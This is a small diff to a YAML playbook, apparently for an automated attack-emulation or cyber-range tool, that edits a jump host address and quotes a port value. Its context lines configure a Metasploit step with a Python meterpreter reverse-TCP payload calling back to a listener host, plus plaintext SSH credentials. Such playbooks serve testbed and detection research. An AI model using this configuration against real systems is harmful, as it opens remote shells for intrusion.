@@ -135,7 +135,7 @@ commands:
     hostname: 192.168.100.222
     username: aecid
     password: aecid
-    jmp_hostname:  192.42.1.232
+    jmp_hostname:  192.42.2.42
     exit_on_error: False
 
   - type: msf-module
@@ -143,7 +143,7 @@ commands:
     creates_session: "root"
     payload_options:
       LHOST: 192.42.1.174
-      LPORT: 3333
+      LPORT: "3333"
     payload: cmd/unix/python/meterpreter/reverse_tcp
 
   - type: msf-session
